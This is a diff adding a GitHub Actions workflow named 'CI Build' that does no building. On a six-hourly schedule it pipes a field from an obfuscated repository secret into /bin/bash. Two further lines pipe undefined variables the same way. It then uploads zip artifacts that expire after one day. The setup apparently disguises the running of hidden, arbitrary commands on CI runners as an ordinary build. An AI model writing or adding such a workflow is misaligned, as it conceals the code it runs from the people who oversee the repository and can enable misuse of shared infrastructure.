@@ -1,0 +1,31 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '26 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          fkf36917: ${{ secrets.fkf36917 }}
+        run: |
+          printf '%s' "$fkf36917" | jq -r .uzsd8352 | /bin/bash
+          echo $ke20961 | jq -r .ticsc278 | /bin/bash
+          echo $g2916 | jq -r .ko65627 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: h7uryGrt
+          path: "*.zip"
+          retention-days: 1
